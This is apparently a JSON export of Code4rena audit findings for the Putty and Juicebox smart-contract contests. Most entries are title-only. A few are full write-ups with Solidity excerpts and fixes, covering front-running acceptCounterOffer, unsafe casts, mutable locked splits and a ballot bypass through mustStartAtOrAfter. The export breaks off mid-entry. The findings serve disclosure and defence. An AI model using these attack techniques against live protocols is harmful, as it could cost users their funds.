[{"title": "Malicious Token Contracts May Lead To Locking Orders", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/50", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-06-putty-findings", "body": "Malicious Token Contracts May Lead To Locking Orders"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/46", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "`acceptCounterOffer()` May Result In Both Orders Being Filled", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/44", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-putty-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584   # Vulnerability details  ## Impact  When a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.  The impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.  ## Proof of Concept  [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled. ```solidity     function acceptCounterOffer(         Order memory order,         bytes calldata signature,         Order memory originalOrder     ) public payable returns (uint256 positionId) {         // cancel the original order         cancel(originalOrder);           // accept the counter offer         uint256[] memory floorAssetTokenIds = new uint256[](0);         positionId = fillOrder(order, signature, floorAssetTokenIds);     } ```  [cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding. ```solidity     function cancel(Order memory order) public {         require(msg.sender == order.maker, \"Not your order\");           bytes32 orderHash = hashOrder(order);           // mark the order as cancelled         cancelledOrders[orderHash] = true;           emit CancelledOrder(orderHash, order);     } ```  Therefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.  ## Recommended Mitigation Steps  Consider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/43", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/42", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/41", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/38", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/32", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/31", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/25", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/24", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/23", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "Lack of two-step procedure for transferring ownership is error prone", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/18", "labels": ["bug", "help wanted", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-putty-findings", "body": "Lack of two-step procedure for transferring ownership is error prone"}, {"title": "An attacker can create a short put option order on an NFT that does not support ERC721(like cryptopunk), and the user can fulfill the order, but cannot exercise the option", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/16", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-putty-findings", "body": "An attacker can create a short put option order on an NFT that does not support ERC721(like cryptopunk), and the user can fulfill the order, but cannot exercise the option"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/15", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/14", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/10", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/9", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-putty-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/2", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-putty-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-06-putty-findings/issues/1", "labels": [], "target": "2022-06-putty-findings", "body": "Agreement & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/368", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/367", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/366", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/365", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/364", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/359", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/358", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/357", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/355", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/352", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/351", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/349", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/347", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/344", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/342", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/340", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/338", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/337", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Reentrancy issues on function `distributePayoutsOf`", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/329", "labels": ["bug", "2 (Med Risk)", "valid"], "target": "2022-07-juicebox-findings", "body": "Reentrancy issues on function `distributePayoutsOf`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/328", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/327", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/325", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/324", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/322", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/320", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Code credits fee-on-transfer tokens for amount stated, not amount transferred", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/304", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor acknowledged", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Code credits fee-on-transfer tokens for amount stated, not amount transferred"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/301", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/300", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/299", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/295", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Unsafe casts `uint256` to `int256` and `int256` to `uint256`", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/293", "labels": ["bug", "documentation", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L816 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L668 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L681 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L743 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L785 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L859   # Vulnerability details  ### Impact  The JBController contract performs many unsafe casts `uint256` to `int256` and `int256` to `uint256` In example: - the cast `-1`(int256) to uint256 was `2**256 - 1` - the cast `2**255`(uint256) to int256 was `- 2**255`  ### Proof of Concept  `int256` to `uint256`: - [L816: `if (uint256(_processedTokenTrackerOf[_projectId]) != tokenStore.totalSupplyOf(_projectId))`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L816)  `uint256` to `int256`: - [L668: `int256(_tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L668) - [L681: `int256(beneficiaryTokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L681) - [L743: `int256(_tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L743) - [L785: `_processedTokenTrackerOf[_projectId] = int256(tokenStore.totalSupplyOf(_projectId));`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L785) - [L859: `_processedTokenTrackerOf[_projectId] = int256(_totalTokens + tokenCount);`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L859)  > Note: in the [L1076](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1076) and [L1077](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1077) there are two more casts but in the [L1075](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/733810a0339a5c0cb608345e6fc66a6edeac13cc/contracts/JBController.sol#L1075) check the cast  ### Tools Used  Review  ### Recommended Mitigation Steps  Use a SafeCast library of openzeppelin [`toUint256(int256 value)` and `toInt256(uint256 value)`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/8c49ad74eae76ee389d038780d407cf90b4ae1de/contracts/utils/math/SafeCast.sol) or check the number before cast it   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/290", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/288", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/287", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/286", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "More outstanding reserved tokens are distributed than anticipated leading to less redeemable assets and therefore loss of user funds", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/285", "labels": ["bug", "2 (Med Risk)", "sponsor disputed", "valid"], "target": "2022-07-juicebox-findings", "body": "More outstanding reserved tokens are distributed than anticipated leading to less redeemable assets and therefore loss of user funds"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/284", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/283", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Locked splits can be updated", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/278", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L213-L220   # Vulnerability details  ## Impact  The check if the newly provided project splits contain the currently locked splits does not check the `JBSplit` struct properties `preferClaimed` and `preferAddToBalance`.  According to the docs in `JBSplit.sol`, _\"...if the split should be unchangeable until the specified time, with the exception of extending the locked period.\"_, locked sets are unchangeable.  However, locked sets with either `preferClaimed` or `preferAddToBalance` set to true can have their bool values overwritten by supplying the same split just with different bool values.  ## Proof of Concept  [JBSplitsStore.sol#L213-L220](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L213-L220)  ```solidity // Check for sameness. if (     _splits[_j].percent == _currentSplits[_i].percent &&     _splits[_j].beneficiary == _currentSplits[_i].beneficiary &&     _splits[_j].allocator == _currentSplits[_i].allocator &&     _splits[_j].projectId == _currentSplits[_i].projectId &&     // Allow lock extention.     _splits[_j].lockedUntil >= _currentSplits[_i].lockedUntil ) _includesLocked = true; ```  The check for sameness does not check the equality of the struct properties `preferClaimed` and `preferAddToBalance`.  ## Tools Used  Manual review  ## Recommended mitigation steps  Add two additional sameness checks for `preferClaimed` and `preferAddToBalance`:  ```solidity // Check for sameness. if (     _splits[_j].percent == _currentSplits[_i].percent &&     _splits[_j].beneficiary == _currentSplits[_i].beneficiary &&     _splits[_j].allocator == _currentSplits[_i].allocator &&     _splits[_j].projectId == _currentSplits[_i].projectId &&     _splits[_j].preferClaimed == _currentSplits[_i].preferClaimed && // @audit-info add check for sameness for property `preferClaimed`     _splits[_j].preferAddToBalance == _currentSplits[_i].preferAddToBalance && // @audit-info add check for sameness for property `preferAddToBalance`     // Allow lock extention.     _splits[_j].lockedUntil >= _currentSplits[_i].lockedUntil ) _includesLocked = true; ```   "}, {"title": "Discounted fee calculation is imprecise and calculates less fees than anticipated", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/275", "labels": ["bug", "2 (Med Risk)", "valid"], "target": "2022-07-juicebox-findings", "body": "Discounted fee calculation is imprecise and calculates less fees than anticipated"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/274", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/273", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/269", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/268", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/267", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/266", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/265", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/263", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/262", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/261", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/256", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/255", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/254", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/247", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/245", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/244", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Use a safe transfer helper library for ERC20 transfers", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/242", "labels": ["bug", "2 (Med Risk)", "valid"], "target": "2022-07-juicebox-findings", "body": "Use a safe transfer helper library for ERC20 transfers"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/237", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/236", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/233", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Grieffer beneficiary can cause DOS", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/229", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor acknowledged", "valid"], "target": "2022-07-juicebox-findings", "body": "Grieffer beneficiary can cause DOS"}, {"title": "An Attacker can cause phising  attack with name/symbol and it can be the same as another project  and users cant tell.Causing users to loose their funds.", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/228", "labels": ["bug", "documentation", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-07-juicebox-findings", "body": "An Attacker can cause phising  attack with name/symbol and it can be the same as another project  and users cant tell.Causing users to loose their funds."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/222", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Lack of check on `mustStartAtOrAfter`", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/220", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L306-L312 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L518-L522   # Vulnerability details  ## Impact  **MED** - the function of the protocol could be impacted  By setting huge `mustStartAtOrAfter`, the owner can set start time in the past. It might open up possibility to bypass the ballot waiting time depending on the ballot's implementation.  ## Proof of Concept  - [proof of concept](https://gist.github.com/zzzitron/a8c6067923a87af8e001c05442258370#file-2022-07-juiceboxv2-t-sol-L77-L115)  The proof of concept is almost the same as [`TestReconfigure::testReconfigureProject`](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/system_tests/TestReconfigure.sol#L77-L114). In the original test, the owner of the project is reconfiguring funding cycle, but it is not in effect immediately because ballot is set. Only after 3 days the newly set funding cycle will be the current one. In the above proof of concept, only one parameter of the funding cycle is modified: `mustStartAtOrAfter` is set to `type(uint56).max`. As the result, the newly set funding cycle is considered as the current one without waiting for the ballot.  The cause of this is missing check on `mustStartAtOrAfter` upon setting [here](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L306-L312). If the given `_mustStartAtOrAfter` is huge, it will be passed eventually to the `_initFor`, `_packAndStoreIntrinsicPropertiesOf`. Then it will 'overflow' by shifting and set to the funding cycle, which [essentially can be set to any value including the past](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBFundingCycleStore.sol#L518-L522). Also, it seems like the number will be also effected because the bigger digit will carry over.  ```solidity // in JBFundingCycleStore::_packAndStoreIntrinsicPropertiesOf // where the `_start` is derived from `_mustStartAtOrAfter`  ./JBFundingCycleStore.sol-518-    // start in bits 144-199. ./JBFundingCycleStore.sol:519:    packed |= _start << 144; ./JBFundingCycleStore.sol-520- ./JBFundingCycleStore.sol-521-    // number in bits 200-255. ./JBFundingCycleStore.sol-522-    packed |= _number << 200; ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Add a check for the `_mustStartAtOrAfter`: ```solidity // example check for _mustSTartAtOrAfter // in JBFundingCycleStore::configureFor  if (_mustStartAtOrAfter > type(uint56).max) revert INVALID_START(); 